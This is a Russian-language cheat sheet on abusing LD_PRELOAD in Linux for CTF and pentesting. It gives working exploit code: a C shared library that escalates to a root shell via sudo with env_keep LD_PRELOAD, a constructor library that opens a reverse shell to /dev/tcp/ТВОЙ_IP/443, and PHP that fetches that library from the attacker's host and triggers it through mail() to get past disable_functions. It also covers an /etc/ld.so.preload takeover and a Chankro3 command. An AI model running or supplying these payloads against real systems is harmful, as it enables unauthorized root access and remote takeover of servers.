# LD_PRELOAD: расширенный cheat sheet

## Что такое LD_PRELOAD

`LD_PRELOAD` — это переменная окружения в Linux. Когда запускается **любая** программа, система загружает библиотеки (`.so` файлы). Если ты установил `LD_PRELOAD=/path/to/shell.so`, эта библиотека загрузится **первой**, ещё до системных .

**Главный трюк:** в этой библиотеке можно написать код, который выполнится **сразу при загрузке**, не дожидаясь, пока программа что-то сделает. Это делается через `__attribute__((constructor))` .

**Аналогия:** представь, что ты подсовываешь охраннику фальшивый пропуск, и он пропускает тебя первым, до всех остальных. Ты внутри, даже если тебя там не ждали.

## Кейс 1: Sudo с `env_keep += LD_PRELOAD`

### Как проверить

```bash
sudo -l
```

Смотри, есть ли в выводе строка:
```
env_keep += "LD_PRELOAD"
```

Если есть — ты можешь передать `LD_PRELOAD` в команду, которую запускаешь через `sudo` .

### Код для `shell.c`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

### Компиляция

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

### Эксплуатация

```bash
sudo LD_PRELOAD=/home/user/shell.so find
```

**Что произойдёт:** `sudo` запустит `find` от root. `find` загрузит `shell.so` (потому что `LD_PRELOAD` указывает на него). Сработает `_init()`, который сделает `setuid(0)` и запустит bash. Ты получишь **root shell** .

**Важно:** `find` — просто пример. Подойдёт **любая** команда, которую ты можешь запускать через `sudo` (из вывода `sudo -l`).

## Кейс 2: PHP `disable_functions` + `mail()`

Это самый частый кейс в CTF и веб-пентесте. Ситуация: у тебя есть RCE через `eval()` или类似, но `system`, `exec`, `shell_exec` отключены через `disable_functions`.

### Почему это работает

PHP запрещает `system()`, но разрешает `mail()`. Когда PHP вызывает `mail()`, он внутри запускает системный бинарник `sendmail`. Если перед вызовом `mail()` установить `LD_PRELOAD=/tmp/shell.so`, то `sendmail` загрузит твою библиотеку, и код выполнится **вне PHP**, от имени `www-data` .

### Код для `shell.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    unsetenv("LD_PRELOAD");
    system("bash -c 'bash -i >& /dev/tcp/ТВОЙ_IP/443 0>&1'");
}
```

### Компиляция

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

### Эксплуатация (через PHP `eval`)

**Шаг 1.** Загрузи `shell.so` на сервер (через `file_put_contents` и `curl`):

```php
$ch=curl_init('http://ТВОЙ_IP/shell.so');
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
file_put_contents('/tmp/shell.so',curl_exec($ch));
curl_close($ch);
```

**Шаг 2.** Установи `LD_PRELOAD` и вызови `mail()`:

```php
putenv('LD_PRELOAD=/tmp/shell.so');
mail('a','a','a','a');
```

**Результат:** reverse shell на твой IP .

### Готовый инструмент: Chankro3

Если не хочешь делать вручную, есть скрипт `chankro3.py`. Он генерирует PHP-файл, который делает всё то же самое (загружает `.so`, настраивает `LD_PRELOAD`, вызывает `mail`) .

```bash
python3 chankro3.py -p rev.sh -o chan.php -r /var/www/html -n myname.so
```

## Кейс 3: `/etc/ld.so.preload` (если можешь писать в файл)

Если у тебя есть права на запись в `/etc/ld.so.preload`, это **проще**, чем `LD_PRELOAD`. Этот файл работает как `LD_PRELOAD`, но **автоматически** применяется ко **всем** бинарникам, включая SUID .

```bash
echo "/tmp/pe.so" > /etc/ld.so.preload
```

После этого **любая** программа загрузит `/tmp/pe.so`. Код в `_init()` выполнится от того пользователя, который запустил программу. Если это SUID-бинарь или cron от root — ты получишь root.

## Шпаргалка: когда что использовать

| Ситуация | Что проверить | Что делать |
|---|---|---|
| `sudo -l` показывает `env_keep += LD_PRELOAD` | `sudo -l` | `sudo LD_PRELOAD=/tmp/x.so <любая_разрешённая_команда>` |
| PHP `disable_functions`, но `mail()` и `putenv()` работают | `phpinfo()` | Загрузить `.so`, `putenv('LD_PRELOAD=...')`, `mail()` |
| Есть запись в `/etc/ld.so.preload` | `ls -la /etc/ld.so.preload` | `echo "/tmp/pe.so" > /etc/ld.so.preload` |
| Нужен автоматический триггер | — | `__attribute__((constructor))` в `.so` |

## Частые ошибки

1. **Забыл `unsetenv("LD_PRELOAD")`** внутри `_init()`. Без этого библиотека будет загружаться рекурсивно и всё сломается.
2. **Используешь `system()` внутри `.so`, но `system` отключён в PHP** — это не проблема, потому что `.so` выполняется **вне PHP**, на уровне ОС. `system` там работает.
3. **Компилируешь без `-nostartfiles`** — тогда `_init()` может не сработать как надо. `-nostartfiles` убирает стандартный код запуска, и твой `_init` становится точкой входа.
4. **Забыл `-fPIC -shared`** — без этого не получится shared object.

## Итог

`LD_PRELOAD` — это не «тяжёлый» эксплойт, а **простой трюк**: подсунуть свою библиотеку программе, которая запускается с нужными правами. Три шага: скомпилировать `.so`, загрузить его, заставить программу его загрузить. Всё остальное — детали конкретной ситуации.